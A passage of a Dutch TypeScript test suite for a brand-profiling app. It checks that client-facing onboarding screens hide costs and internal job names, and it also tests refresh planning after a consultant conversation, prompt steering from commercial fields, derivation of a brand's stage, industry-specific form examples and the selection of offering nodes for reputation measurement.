    "app/(app)/merk/[id]/_components/brand-field-input.tsx",
  ];

  const verboden = [
    { term: "cost_usd", waarom: "een bedrag per aanroep" },
    { term: "ai_calls", waarom: "het kostenlogboek" },
    { term: "model_used", waarom: "een modelnaam" },
    { term: "MODELS.", waarom: "een modelnaam" },
    { term: "jobs", waarom: "de wachtrij" },
    { term: "job_type", waarom: "een jobtype" },
    { term: "profile_llm_baseline", waarom: "een interne tabelnaam in beeld" },
    { term: "last_error", waarom: "een foutmelding uit de wachtrij" },
    { term: "status: 403", waarom: "een foutcode" },
    { term: "status: 500", waarom: "een foutcode" },
  ];

  for (const pad of sessieBestanden) {
    const inhoud = leesBestand(pad);
    ok(`${pad} bestaat`, inhoud.length > 0);
    for (const { term, waarom } of verboden) {
      ok(
        `${pad.split("/").pop()}: geen ${waarom} (${term})`,
        !inhoud.includes(term),
      );
    }
    // Een bedrag is een dollarteken met een cijfer erachter. Het losse teken
    // verbieden kan niet: elke sjabloonstring in JSX gebruikt `${...}`.
    ok(
      `${pad.split("/").pop()}: geen bedrag in beeld`,
      !/\$\s?\d/.test(inhoud) && !inhoud.includes("toFixed"),
    );
  }

  // De taaknamen zelf, bij naam. Een jobtype op dit scherm is precies het
  // soort ding dat je in een demo niet wilt hoeven uitleggen.
  const sessie = leesBestand("app/(app)/merk/[id]/_components/onboarding-session.tsx");
  const taaknamen = [
    "profile_discover",
    "profile_research",
    "profile_offering",
    "profile_market",
    "technical_audit",
    "propose_topics",
    "profile_synthesis",
    "measure_prompt",
  ];
  for (const taak of taaknamen) {
    ok(`de sessie noemt ${taak} nergens`, !sessie.includes(taak));
  }

  // En de tegenhanger: het scherm moet wél de velden uit de catalogus tonen,
  // anders is het een tweede formulier geworden.
  ok(
    "de sessie rendert de gedeelde veldweergave",
    sessie.includes("BrandFieldInput"),
  );
  // ⚠️ Geen tweede veldenlijst. `derivable` en `placeholder` zijn de merkers
  // van een velddefinitie; staan die hier, dan is er alsnog een tweede formulier
  // ontstaan dat gaat verouderen.
  ok(
    "en definieert zelf geen velden",
    !sessie.includes("derivable:") && !sessie.includes("placeholder:"),
  );
});


group("wat er na het gesprek opnieuw moet draaien (fase 4)", () => {
  // ⚠️ ELK VAN DE VIJFTIEN VELDEN, ÓÓK DE VELDEN DIE NUL STAPPEN OPLEVEREN.
  //
  // Een veld dat niet in de tabel staat, is een veld waarvan niemand heeft
  // nagedacht of hij iets moet triggeren. Dat merk je pas als er een dure stap
  // onnodig draait, of juist niet draait.
  const velden = BRAND_FIELDS.filter(
    (f) => f.step === "strategie" || f.step === "contact",
  ).map((f) => f.key as string);
  const ontbreekt = velden.filter((v) => !(v in FIELD_TASKS));
  ok(
    `elk nieuw veld staat in de tabel${ontbreekt.length ? " (mist: " + ontbreekt.join(", ") + ")" : ""}`,
    ontbreekt.length === 0,
  );
  ok("en het bereik en het werkgebied ook", "service_scope" in FIELD_TASKS && "service_regions" in FIELD_TASKS);

  // Het bereik is het duurste veld: het bepaalt of de vragen regionaal of
  // landelijk gesteld worden, en dat is pas ná een betaalde meting te zien.
  const bereik = planRefresh(["service_scope"], { analyses: 1 });
  ok("een gewijzigd bereik laat de vragen opnieuw opstellen", bereik.tasks.includes("prompts"));
  ok("en de kennistest opnieuw draaien", bereik.tasks.includes("kennistest"));
  ok("maar niet het marktonderzoek", !bereik.tasks.includes("markt"));

  ok(
    "een gewijzigde concurrent raakt alleen de markt",
    planRefresh(["competitors"]).tasks.join() === "markt",
  );
  ok(
    "de commerciële sturing raakt alleen de onderwerpen",
    planRefresh(["priority_offerings", "forbidden_topics"]).tasks.join() === "onderwerpen",
  );

  // ⚠️ Vijf velden waar NUL stappen uit volgen. Dat is de helft van de winst
  // van deze module: zonder die nullen zou elk gesprek de duurste stappen
  // opnieuw draaien voor een telefoonnummer.
  const nulVelden = [
    "name_exclusions",
    "offline_proof",
    "sales_objections",
    "goal_12m",
    "deal_value_band",
    "seasonality",
    "respect_site_structure",
    "contact_name",
    "contact_email",
    "contact_phone",
  ];
  for (const veld of nulVelden) {
    ok(`${veld} laat niets opnieuw draaien`, planRefresh([veld]).tasks.length === 0);
  }
  ok(
    "en samen ook niet",
    planRefresh(nulVelden).tasks.length === 0,
  );

  // Zonder analyse valt de promptstap weg: een knop die een stap inplant die
  // nergens op slaat is erger dan geen knop.
  ok(
    "zonder analyse geen promptgeneratie",
    !planRefresh(["service_regions"], { analyses: 0 }).tasks.includes("prompts"),
  );
  ok(
    "de kennistest blijft dan wel staan",
    planRefresh(["service_regions"], { analyses: 0 }).tasks.includes("kennistest"),
  );

  // De raming schaalt mee met het aantal analyses, want de vragen worden per
  // analyse opnieuw opgesteld.
  const een = planRefresh(["service_scope"], { analyses: 1 }).estimateUsd;
  const drie = planRefresh(["service_scope"], { analyses: 3 }).estimateUsd;
  ok("meer analyses is een hogere raming", drie > een);
  ok("en de raming blijft onder een dubbeltje per analyse", drie < 0.3, `$${drie}`);

  // De bevestiging. ⚠️ Die staat in deze pure module en niet in het scherm:
  // de sessiepagina wordt met de klant gedeeld en er mag geen bedrag in beeld.
  const niets = refreshConfirmation(planRefresh([]));
  ok("niets veranderd levert een zin op die dat zegt", niets.body.includes("niets veranderd"));
  ok("en geen apart kostenblokje", niets.cost === null);
  const bevestiging = refreshConfirmation(planRefresh(["service_scope"], { analyses: 1 }));
  ok("het bedrag staat in het aparte kostenblokje", bevestiging.cost?.includes("$") ?? false);
  ok("niet in de lopende tekst", !bevestiging.body.includes("$"));
  ok("de lopende tekst zegt in gewone taal wat er gebeurt", bevestiging.body.includes(TASK_LABELS.kennistest));
  ok(
    "zonder taaknamen",
    !bevestiging.body.includes("profile_llm_baseline") &&
      !bevestiging.body.includes("generate_prompts"),
  );
});

group("de onderzoeksketen kapt niet af als een stap opgeeft", () => {
  // ⚠️ Het punt van de Teamsessie van 18 augustus 2026: `profile_offering` telt
  // als niet-blokkerend omdat de klant bij een mislukking alleen zijn
  // dienstenoverzicht mist, maar diezelfde stap plande de markt in, en de markt
  // draagt de kennistest en de synthese.
  ok("de aanbodstap wijst naar de markt", nextInChain("profile_offering") === "profile_market");
  ok("de markt naar de kennistest", nextInChain("profile_market") === "profile_llm_baseline");
  ok("de kennistest naar de synthese", nextInChain("profile_llm_baseline") === "profile_synthesis");
  ok("en de synthese sluit de keten", nextInChain("profile_synthesis") === null);

  // De topicvoorstellen horen er bewust NIET in: die hangen aan de aanbodboom
  // en hebben zonder knopen niets te zoeken.
  ok("de topicvoorstellen hangen niet in de keten", !("propose_topics" in ONBOARDING_NEXT));
  // Het profielonderzoek is blokkerend: mislukt dat, dan hoort er niets meer
  // achteraan te komen.
  ok("en het profielonderzoek ook niet", !("profile_research" in ONBOARDING_NEXT));
  ok("een taak buiten de keten levert niets op", nextInChain("measure_prompt") === null);
});

group("de commerciële laag heeft echte lezers (fase 4)", () => {
  const leeg = {
    priority_offerings: [],
    deprioritised_offerings: [],
    target_segments: [],
    forbidden_topics: [],
    growth_regions: [],
    sales_objections: [],
    offline_proof: [],
    respect_site_structure: null,
    goal_12m: null,
    seasonality: null,
  };

  // ⚠️ Een leeg veld levert een LEGE string op. "Verboden onderwerpen: " in een
  // prompt is erger dan niets: het model gaat er betekenis aan geven.
  ok("een leeg profiel levert geen enkele regel op", topicSteering(leeg) === "");
  ok("ook niet voor de groeiregio's", growthRegionsRule(leeg) === "");
  ok("of de bezwaren", objectionsRule(leeg) === "");
  ok("of het doel", goalRule(leeg) === "");
  // Niet vastgesteld is iets anders dan 'nee': alleen een expliciete nee
  // verandert het advies (conventie 3).
  ok("niet vastgesteld verandert niets aan de structuur", siteStructureRule(leeg) === "");
  ok(
    "'ja' ook niet",
    siteStructureRule({ respect_site_structure: true }) === "",
  );
  ok(
    "maar 'nee' wel",
    siteStructureRule({ respect_site_structure: false }).includes("geen nieuwe pagina"),
  );

  const gevuld = {
    ...leeg,
    priority_offerings: ["onderhoudsabonnementen"],
    deprioritised_offerings: ["losse bandenwissel"],
    target_segments: ["installateurs met eigen monteurs"],
    forbidden_topics: ["lopende rechtszaken"],
  };
  const sturing = topicSteering(gevuld);
  ok("wat voorop staat komt erin", sturing.includes("onderhoudsabonnementen"));
  ok("wat niet mag ook", sturing.includes("losse bandenwissel"));
  ok("met de instructie om er niets over voor te stellen", sturing.includes("NIET VOORSTELLEN"));
  ok("de klantgroepen komen erin", sturing.includes("installateurs"));
  ok("en de verboden onderwerpen", sturing.includes("lopende rechtszaken"));

  // De deterministische controle achteraf. Een promptinstructie is een
  // intentie, dit is de garantie (conventie 1).
  ok(
    "een verboden onderwerp in de tekst wordt gevonden",
    forbiddenTopicHits("Over de Lopende Rechtszaken kunnen we kort zijn.", gevuld).length === 1,
  );
  ok(
    "hoofdletters maken niet uit",
    forbiddenTopicHits("LOPENDE RECHTSZAKEN", gevuld)[0] === "lopende rechtszaken",
  );
  ok("en een schone tekst levert niets op", forbiddenTopicHits("Een gewone pagina.", gevuld).length === 0);

  // Bewijs dat niet op de site staat, met de bron erbij. Dat verschil moet de
  // claimvalidator kunnen zien: "opgegeven in het gesprek" is iets anders dan
  // "staat op je site".
  const feiten = offlineProofFacts({ offline_proof: ["ISO 9001 sinds 2019", "  "] });
  ok("lege regels vallen weg", feiten.length === 1);
  ok("en de bron zegt waar het vandaan komt", feiten[0].source.includes("gesprek"));

  const bezwaren = objectionsRule({ sales_objections: ["jullie zijn duurder"] });
  ok("de bezwaren komen in de schrijfopdracht", bezwaren.includes("duurder"));
  ok("met de opdracht er één te weerleggen", bezwaren.includes("weerleg"));
});

group("het verwarringblok levert de uitsluitingslijst (fase 4)", () => {
  // ⚠️ Deterministisch en niet met een tweede AI-aanroep: het antwoord is een
  // opsomming, en een opsomming is te lezen zonder model. Een gemiste naam kost
  // een bevestiging in het gesprek; een verzonnen naam zet een echt bedrijf op
  // een uitsluitingslijst.
  const antwoord = [
    "Ja, er zijn meerdere partijen die zo heten:",
    "- **Jansen Techniek** in Groningen, een installatiebedrijf.",
    "- Jansen Bouw - een aannemer uit Zwolle",
    "1. Jansen Advies: een adviesbureau",
    "Verder is er niets bekend.",
  ].join("\n");

  const uit = extractConfusions(antwoord, ["Jansen"]);
  ok("de vetgedrukte naam komt eruit", uit.includes("Jansen Techniek"));
  ok("de naam vóór het streepje ook", uit.includes("Jansen Bouw"), uit.join(" · "));
  ok("en de naam vóór de dubbele punt", uit.includes("Jansen Advies"));
  ok("de lopende tekst eromheen niet", !uit.some((n) => n.includes("Verder is er")));
  ok("het zijn er drie", uit.length === 3, uit.join(" · "));

  // Het eigen merk hoort er nooit in: dat zou de meting de eigen vermeldingen
  // laten wegfilteren, en dan valt de score te laag uit.
  ok(
    "het eigen merk valt weg",
    !extractConfusions("- Jansen Techniek\n- Bakkerij Jansen", ["Bakkerij Jansen"]).includes(
      "Bakkerij Jansen",
    ),
  );
  ok(
    "een antwoord zonder opsomming levert niets op",
    extractConfusions("Nee, ik ken geen andere bedrijven met die naam.", ["Jansen"]).length === 0,
  );
});


group("de fase van een merk, afgeleid en niet ingevuld (fase 5)", () => {
  const basis = {
    openResearchJobs: 0,
    researchDone: true,
    recordedAt: null as string | null,
    assignedAt: null as string | null,
  };

  // ── De vier fases, in de volgorde waarin ze doorlopen worden ─────────────
  ok(
    "onderzoek dat nog draait is voorbereiden",
    profileStage({ ...basis, openResearchJobs: 2 }) === "voorbereiden",
  );
  ok(
    "een profiel dat nog niet klaar is ook",
    profileStage({ ...basis, researchDone: false }) === "voorbereiden",
  );
  ok(
    "onderzoek klaar en geen gesprek is klaar voor het gesprek",
    profileStage(basis) === "klaar_voor_gesprek",
  );
  ok(
    "een vastgelegd gesprek is 'gesprek gehad'",
    profileStage({ ...basis, recordedAt: "2026-08-19T10:00:00Z" }) === "gesprek_gehad",
  );
  ok(
    "en een toegewezen merk is overgedragen",
    profileStage({
      ...basis,
      recordedAt: "2026-08-19T10:00:00Z",
      assignedAt: "2026-08-20T10:00:00Z",
    }) === "overgedragen",
  );

  // ⚠️ HET GEVAL UIT HET VERIFICATIECRITERIUM: overgedragen zónder dat er ooit
  // een gesprek is vastgelegd. Dat gebeurt echt (de consultant vergat het, of
  // de klant tekende na één mail), en "wacht op een gesprek" is dan onzin: hij
  // werkt er al zelf in.
  ok(
    "overgedragen zonder gesprek is nog steeds overgedragen",
    profileStage({ ...basis, assignedAt: "2026-08-20T10:00:00Z" }) === "overgedragen",
  );

  // ⚠️ En het geval dat fase 4 erbij maakte: ná het gesprek plant het afrondblok
  // nieuw onderzoek in. Er staat dan werk open terwijl het gesprek al geweest
  // is, en "voorbereiden" zou precies het verkeerde signaal zijn.
  ok(
    "een herdraai na het gesprek zet de fase niet terug",
    profileStage({
      ...basis,
      openResearchJobs: 3,
      recordedAt: "2026-08-19T10:00:00Z",
    }) === "gesprek_gehad",
  );

  // Elke fase zegt wat de volgende handeling is, niet wat de toestand is.
  ok(
    "elke fase heeft een label en een volgende stap",
    STAGE_ORDER.every(
      (f) => STAGE_LABEL[f].length > 3 && STAGE_NEXT[f].length > 10,
    ),
  );
  ok("het zijn er vier", STAGE_ORDER.length === 4);
  ok(
    "en elke fase is bereikbaar",
    new Set([
      profileStage({ ...basis, researchDone: false }),
      profileStage(basis),
      profileStage({ ...basis, recordedAt: "x" }),
      profileStage({ ...basis, assignedAt: "x" }),
    ]).size === 4,
  );
});


group("het formulier praat de taal van de branche", () => {
  // ── De branche herkennen uit wat het onderzoek vond ──────────────────────
  const gevallen: [string, BrandCategory][] = [
    ["autodealer", "automotive"],
    ["universeel garagebedrijf met schadeherstel", "automotive"],
    ["fysiotherapiepraktijk", "zorg"],
    ["tandartspraktijk", "zorg"],
    ["advocatenkantoor", "juridisch_financieel"],
    ["accountantskantoor en belastingadvies", "juridisch_financieel"],
    ["installatiebedrijf voor warmtepompen", "bouw_installatie"],
    ["webshop in sieraden", "retail"],
    ["modewinkel", "retail"],
    ["machinebouw en metaalbewerking", "maakindustrie"],
    ["makelaardij", "vastgoed"],
    ["marketingbureau", "zakelijke_dienstverlening"],
    ["B2B-software voor de bouw", "software"],
    ["restaurant met zalenverhuur", "horeca_recreatie"],
    ["rijschool", "opleiding"],
    ["kapsalon", "persoonlijke_verzorging"],
    ["transportbedrijf", "transport_logistiek"],
  ];
  for (const [branche, verwacht] of gevallen) {
    const uit = categoryOf({ industry: branche });
    ok(`"${branche}" wordt ${verwacht}`, uit === verwacht, uit);
  }

  // ⚠️ HET LANGSTE TREFWOORD WINT, niet het eerste. Zonder die regel belandt
  // een bouwmarkt bij bouw in plaats van bij retail.
  ok("een bouwmarkt is retail en geen bouwbedrijf", categoryOf({ industry: "bouwmarkt" }) === "retail");
  ok(
    "autoschadeherstel is automotive en geen bouw",
    categoryOf({ industry: "autoschadeherstel" }) === "automotive",
  );

  // De naam telt mee: "Installatiebedrijf Van Dijk" zegt het al in zijn naam,
  // ook als het onderzoek er "technische dienstverlening" van maakte.
  ok(
    "de bedrijfsnaam telt mee als de branchetekst vaag is",
    categoryOf({ industry: "technische dienstverlening", name: "Installatiebedrijf Van Dijk" }) ===
      "bouw_installatie",
  );

  // ── De terugval, en dat is de kern van de vraag "wat als het niet past" ──
  ok(
    "een onbekende branche valt terug op algemeen",
    categoryOf({ industry: "iets heel anders" }) === "algemeen",
  );
  ok("een leeg profiel ook", categoryOf({}) === "algemeen");
  // Maar niet als het bedrijfsmodel wél iets zegt: een fabrikant lijkt meer op
  // een fabrikant dan op niets.
  ok(
    "een onbekende fabrikant krijgt de maakindustrie",
    categoryOf({ industry: "iets heel anders", businessModel: "fabrikant" }) === "maakindustrie",
  );
  ok(
    "een onbekende retailer krijgt retail",
    categoryOf({ businessModel: "retailer" }) === "retail",
  );
  ok(
    "een dienstverlener zonder branche blijft algemeen",
    categoryOf({ businessModel: "dienstverlener" }) === "algemeen",
  );

  // ── De voorbeelden zelf ─────────────────────────────────────────────────
  ok("er zijn veertien categorieën", CATEGORIES.length === 14, `${CATEGORIES.length}`);
  ok(
    "elke categorie heeft een leesbare naam",
    CATEGORIES.every((c) => CATEGORY_LABEL[c].length > 3),
  );
  // ⚠️ Automotive is een harde eis: het is de branche waar de eerste klanten
  // vandaan komen.
  ok("automotive bestaat", CATEGORIES.includes("automotive"));

  const echteCategorieen = CATEGORIES.filter((c) => c !== "algemeen");
  const teWeinig = echteCategorieen.filter((c) => exampleCount(c) < 18);
  ok(
    `elke branche heeft minstens achttien eigen voorbeelden${teWeinig.length ? " (te weinig: " + teWeinig.join(", ") + ")" : ""}`,
    teWeinig.length === 0,
  );
  ok("en algemeen heeft er nul, want dat is de terugval", exampleCount("algemeen") === 0);

  // ⚠️ Elk voorbeeld hoort bij een veld dat écht bestaat. Een typefout in een
  // sleutel levert een voorbeeld op dat nergens verschijnt, en dat merk je pas
  // als een klant erover valt.
  const bestaandeVelden = new Set(BRAND_FIELDS.map((f) => f.key as string));
  const onbekend: string[] = [];
  for (const categorie of echteCategorieen) {
    const kaart = examplesFor({
      industry: null,
      business_model: null,
      name: CATEGORY_LABEL[categorie],
      brand_name: null,
    });
    void kaart;
  }
  for (const branche of gevallen) {
    const kaart = examplesFor({
      industry: branche[0],
      business_model: null,
      name: null,
      brand_name: null,
    });
    for (const sleutel of Object.keys(kaart)) {
      if (!bestaandeVelden.has(sleutel)) onbekend.push(`${branche[1]}.${sleutel}`);
    }
  }
  ok(
    `elk voorbeeld hoort bij een bestaand veld${onbekend.length ? " (onbekend: " + onbekend.join(", ") + ")" : ""}`,
    onbekend.length === 0,
  );

  // De voorbeelden zijn ook echt anders per branche: dat is het hele punt.
  const auto = examplesFor({ industry: "autodealer", business_model: null, name: null, brand_name: null });
  const zorg = examplesFor({ industry: "fysiotherapie", business_model: null, name: null, brand_name: null });
  ok("een garage krijgt een garagevoorbeeld", auto.products?.includes("APK") === true);
  ok("een praktijk krijgt een zorgvoorbeeld", zorg.products?.includes("therapie") === true);
  ok(
    "en ze delen geen enkel voorbeeld",
    Object.keys(auto).every((k) => auto[k] !== zorg[k]),
  );

  // Een merk zonder branche krijgt een lege kaart, en dan blijft het algemene
  // voorbeeld uit de veldencatalogus staan.
  ok(
    "zonder branche geen eigen voorbeelden",
    Object.keys(
      examplesFor({ industry: null, business_model: null, name: null, brand_name: null }),
    ).length === 0,
  );

  // Geen lege of half afgemaakte teksten: een voorbeeld van twee tekens is
  // erger dan geen voorbeeld.
  const teKort: string[] = [];
  for (const [branche, categorie] of gevallen) {
    const kaart = examplesFor({ industry: branche, business_model: null, name: null, brand_name: null });
    for (const [sleutel, tekst] of Object.entries(kaart)) {
      if (tekst.trim().length < 4) teKort.push(`${categorie}.${sleutel}`);
    }
  }
  ok(`geen te korte voorbeelden${teKort.length ? " (" + teKort.join(", ") + ")" : ""}`, teKort.length === 0);

  // ⚠️ Elke branche vult dezelfde velden. Vergeet je er één bij het toevoegen
  // van een branche, dan krijgt die klant op dat ene veld het autovoorbeeld
  // terug, en dat is precies wat dit bestand moest oplossen.
  const eersteSet = Object.keys(
    examplesFor({ industry: "autodealer", business_model: null, name: null, brand_name: null }),
  ).sort();
  const afwijkend: string[] = [];
  for (const [branche, categorie] of gevallen) {
    const kaart = examplesFor({ industry: branche, business_model: null, name: null, brand_name: null });
    if (Object.keys(kaart).sort().join(",") !== eersteSet.join(",")) afwijkend.push(categorie);
  }
  ok(
    `elke branche vult dezelfde velden${afwijkend.length ? " (wijkt af: " + afwijkend.join(", ") + ")" : ""}`,
    afwijkend.length === 0,
  );

  // ── Een voorbeeld alleen waar het iets toevoegt (19 augustus 2026) ──────
  //
  // Tien velden hebben bewust geen voorbeeld: het label bepaalt het antwoord al
  // volledig. Een branchevoorbeeld zou die keuze stilletjes terugdraaien, want
  // dat wint van het algemene voorbeeld in `brand-field-input.tsx`.
  const zonderVoorbeeld = new Set(
    BRAND_FIELDS.filter((f) => !f.placeholder && f.kind !== "keuze" && f.kind !== "schuif" && f.kind !== "janee").map(
      (f) => f.key as string,
    ),
  );
  ok(
    "tien velden hebben bewust geen voorbeeld",
    zonderVoorbeeld.size === 10,
    `${zonderVoorbeeld.size}`,
  );
  ok(
    "je eigen bedrijfsnaam en je contactgegevens horen daarbij",
    ["name", "contact_name", "contact_email", "contact_phone", "competitors"].every((k) =>
      zonderVoorbeeld.has(k),
    ),
  );
  const stiekem: string[] = [];
  for (const [branche, categorie] of gevallen) {
    const kaart = examplesFor({ industry: branche, business_model: null, name: null, brand_name: null });
    for (const sleutel of Object.keys(kaart)) {
      if (zonderVoorbeeld.has(sleutel)) stiekem.push(`${categorie}.${sleutel}`);
    }
  }
  ok(
    `geen branchevoorbeeld voor een veld dat er geen hoort te hebben${stiekem.length ? " (" + stiekem.join(", ") + ")" : ""}`,
    stiekem.length === 0,
  );

  // ⚠️ Bij een lijstveld staat het voorbeeld in het vakje waar je één regel
  // toevoegt. "Verlichting, meubels, woontextiel, decoratie" leest daar als
  // "typ ze allemaal achter elkaar", en dan staat het hele aanbod in één regel.
  const lijstVelden = new Set(
    BRAND_FIELDS.filter((f) => f.kind === "lijst").map((f) => f.key as string),
  );
  const opsommingen: string[] = [];
  for (const veld of BRAND_FIELDS) {
    if (veld.kind !== "lijst" || !veld.placeholder) continue;
    if (veld.placeholder.split(", ").length >= 3) opsommingen.push(`algemeen.${String(veld.key)}`);
  }
  for (const [branche, categorie] of gevallen) {
    const kaart = examplesFor({ industry: branche, business_model: null, name: null, brand_name: null });
    for (const [sleutel, tekst] of Object.entries(kaart)) {
      if (lijstVelden.has(sleutel) && tekst.split(", ").length >= 3) {
        opsommingen.push(`${categorie}.${sleutel}`);
      }
    }
  }
  ok(
    `een lijstvoorbeeld is één regel${opsommingen.length ? " (" + opsommingen.join(", ") + ")" : ""}`,
    opsommingen.length === 0,
  );
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nMijn reputatie: de rekenkundige kern (22 augustus 2026, sprint R1)");

/** Een aanbodknoop met alleen de velden die de selectie leest. */
function knoop(
  id: string,
  name: string,
  kind: ProfileOffering["kind"],
  sortOrder: number,
): ProfileOffering {
  return {
    id,
    profile_id: "p1",
    parent_id: null,
    kind,
    name,
    description: null,
    audience: null,
    price_indication: null,
    evidence_url: null,
    evidence_quote: null,
    confidence: null,
    source: "ai",
    sort_order: sortOrder,
    created_at: "",
    updated_at: "",
  };
}

function onderwerp(
  id: string,
  title: string,
  offeringIds: string[],
  priority: number,
  status: ProfileTopic["status"] = "goedgekeurd",
): ProfileTopic {
  return {
    id,
    profile_id: "p1",
    title,
    rationale: null,
    offering_ids: offeringIds,
    offering_names: [],
    priority,
    client_note: null,
    status,
    analysis_id: null,
    search_volume_index: null,
    search_volume_reasoning: null,
    created_at: "",
    updated_at: "",
  };
}

group("de knopenselectie kapt 60 knopen af op 12, met de prioriteiten bovenaan", () => {
  // Zestig knopen, oplopend genummerd. `dienst-40` staat achteraan in de
  // boomvolgorde en zou zonder prioritering nooit gemeten worden.
  const boom = Array.from({ length: 60 }, (_, i) =>
    knoop(`o${i}`, `dienst-${i}`, i < 50 ? "dienst" : "categorie", i),
  );

  const gekozen = selectNodes({
    offerings: boom,
    topics: [],
    priorityNames: ["dienst-40"],
    deprioritisedNames: [],
  });

  ok("er blijven er precies 12 over", gekozen.length === MAX_NODES_STANDARD, `${gekozen.length}`);
  ok(
    "en de prioriteit van de consultant staat bovenaan",
    gekozen[0].offering.name === "dienst-40" && gekozen[0].reason === "prioriteit",
    gekozen[0].offering.name,
  );

  // ⚠️ Dit is de fout die `llm-baseline.ts` op 4 augustus 2026 heeft rechtgezet:
  // de eerste knopen van de boom komen van de website en zijn de algemeenste
  // diensten, precies waar iedereen op concurreert.
  const metOnderwerp = selectNodes({
    offerings: boom,
    topics: [onderwerp("t1", "Specialisme", ["o55", "o44"], 90)],
    priorityNames: [],
    deprioritisedNames: [],
  });
  ok(
    "een goedgekeurd onderwerp trekt zijn knopen naar voren",
    metOnderwerp[0].offering.id === "o55" && metOnderwerp[0].reason === "onderwerp",
    metOnderwerp[0].offering.id,
  );

  // Een voorgesteld onderwerp is een mening van het model die nog niemand
  // bevestigd heeft, en die mag de boomvolgorde niet overrulen.
  const voorgesteld = selectNodes({
    offerings: boom,
    topics: [onderwerp("t1", "Specialisme", ["o55"], 90, "voorgesteld")],
    priorityNames: [],
    deprioritisedNames: [],
  });
  ok(
    "een voorgesteld onderwerp doet dat niet",
    voorgesteld[0].offering.id === "o0",
    voorgesteld[0].offering.id,
  );

  ok("de diepe modus mag er 25", MAX_NODES_DEEP === 25);
  ok(
    "en levert er dan ook 25",
    selectNodes({
      offerings: boom,
      topics: [],
      priorityNames: [],
      deprioritisedNames: [],
      limit: MAX_NODES_DEEP,
    }).length === 25,
  );
});

group("weggezette knopen en de soorten merk en vestiging komen er nooit in", () => {
  const boom = [
    knoop("o1", "Onderhoud", "dienst", 0),
    knoop("o2", "Volkswagen", "merk", 1),
    knoop("o3", "Vestiging Tilburg", "vestiging", 2),
    knoop("o4", "Schadeherstel", "dienst", 3),
    knoop("o5", "Occasions", "product", 4),
  ];

  const gekozen = selectNodes({
    offerings: boom,
    topics: [],
    priorityNames: [],
    deprioritisedNames: ["Schadeherstel"],
  });
  const namen = gekozen.map((g) => g.offering.name);

  ok("een weggezette knoop valt eraf", !namen.includes("Schadeherstel"), namen.join(", "));
  // Bij een retailer zijn de gevoerde merken niet zijn reputatie maar die van
  // iemand anders.
  ok("de soort merk komt er nooit in", !namen.includes("Volkswagen"));
  ok("de soort vestiging ook niet", !namen.includes("Vestiging Tilburg"));
  ok("wat overblijft is wél gemeten", namen.length === 2, namen.join(", "));

  // Wegzetten wint van prioriteren: dat is de expliciete beslissing.
  const conflict = selectNodes({
    offerings: boom,
    topics: [],
    priorityNames: ["Schadeherstel"],
    deprioritisedNames: ["Schadeherstel"],
  });
  ok(
    "wegzetten wint van prioriteren",
    !conflict.map((g) => g.offering.name).includes("Schadeherstel"),
  );
});

group("een strategische knoop weegt zwaarder dan opvulling", () => {
  // ⚠️ DE FOUT DIE OP PRODUCTIE ZICHTBAAR WERD (23 augustus 2026). Het gewicht
  // van een knoop uit een onderwerp was de RUWE prioriteit van dat onderwerp,
  // in de veronderstelling dat die op 1 tot 99 loopt. Bij Van den Udenhout
  // stonden de goedgekeurde onderwerpen op 5, 6 en 7, terwijl opvulling een
  // vaste 10 had. Knopen die een mens had aangewezen wogen dus lichter dan
  // generieke opvulling.
  const boom = [
    knoop("o1", "Algemene dienst", "dienst", 0),
    knoop("o2", "Specialisme", "dienst", 1),
    knoop("o3", "Categorie", "categorie", 2),
    knoop("o4", "Wat de consultant koos", "dienst", 3),
  ];

  const gekozen = selectNodes({
    offerings: boom,
    // Prioriteit van 6, precies de schaal die op productie voorkomt.
    topics: [onderwerp("t1", "Specialisme", ["o2"], 6)],
    priorityNames: ["Wat de consultant koos"],
    deprioritisedNames: [],
  });

  const gewichtVan = (naam: string) =>
    gekozen.find((g) => g.offering.name === naam)?.weight ?? 0;

  ok(
    "de keuze van de consultant weegt het zwaarst",
    gewichtVan("Wat de consultant koos") > gewichtVan("Specialisme"),
    `${gewichtVan("Wat de consultant koos")} tegen ${gewichtVan("Specialisme")}`,
  );
  // ⚠️ Dit is de regel die eerst omgekeerd stond, en het is dezelfde fout die
  // `llm-baseline.ts` op 4 augustus 2026 rechtzette: meten op de algemeenste
  // diensten in plaats van op waar de klant zich onderscheidt.
  ok(
    "een onderwerp weegt zwaarder dan opvulling, ook bij prioriteit 6",
    gewichtVan("Specialisme") > gewichtVan("Algemene dienst"),
    `${gewichtVan("Specialisme")} tegen ${gewichtVan("Algemene dienst")}`,
  );
  ok(
    "en een categorie weegt het lichtst",
    gewichtVan("Categorie") < gewichtVan("Algemene dienst"),
    `${gewichtVan("Categorie")} tegen ${gewichtVan("Algemene dienst")}`,
  );

  // In de diepe modus kiest `heaviestNodes` welke knopen drie rotaties krijgen
  // en daarmee de chip `indicatief` verliezen. Dat moeten de strategische zijn.
  const zwaarste = heaviestNodes(gekozen, 2).map((n) => n.offering.name);
  eq(
    "en de diepe modus kiest de strategische knopen",
    zwaarste.join(", "),
    "Wat de consultant koos, Specialisme",
  );
});

group("de zwaarste knopen zijn reproduceerbaar", () => {
  const boom = Array.from({ length: 12 }, (_, i) => knoop(`o${i}`, `dienst-${i}`, "dienst", i));
  const gekozen = selectNodes({
    offerings: boom,
    topics: [],
    priorityNames: ["dienst-9", "dienst-3"],
    deprioritisedNames: [],
  });

  const eerste = heaviestNodes(gekozen, 8).map((n) => n.offering.id).join();
  const tweede = heaviestNodes([...gekozen].reverse(), 8).map((n) => n.offering.id).join();
  // ⚠️ Bij gelijk gewicht beslist de naam en niet de rijvolgorde uit Postgres.
  // Zonder die vaste tiebreak is de chip `indicatief` niet reproduceerbaar.
  eq("dezelfde set, ongeacht de invoervolgorde", eerste, tweede);
});

/** Een entiteit met alleen de velden die de concurrentkeuze leest. */
function entiteit(
  naam: string,
  role: Entity["entity_role"],
  dismissed = false,
): Entity {
  return {
    id: `e-${naam}`,
    profile_id: "p1",
    canonical_name: naam,
    normalized: naam.toLowerCase(),
    aliases: [],
    entity_role: role,
    role_source: "ai",
    exclude_reason: null,
    confirmed: true,
    dismissed,
    created_at: "",
    updated_at: "",
  };
}

group("de concurrentkeuze: gemeten wint, weggezet komt er nooit in", () => {
  const keuze = selectRivals({
    measured: [
      { entity: entiteit("Werkspot", "vergelijker"), mentions: 40 },
      { entity: entiteit("Concurrent A", "concurrent"), mentions: 12 },
      { entity: entiteit("Concurrent B", "concurrent"), mentions: 9 },
      { entity: entiteit("Weggezet BV", "concurrent", true), mentions: 30 },
      { entity: entiteit("Concurrent C", "concurrent"), mentions: 4 },
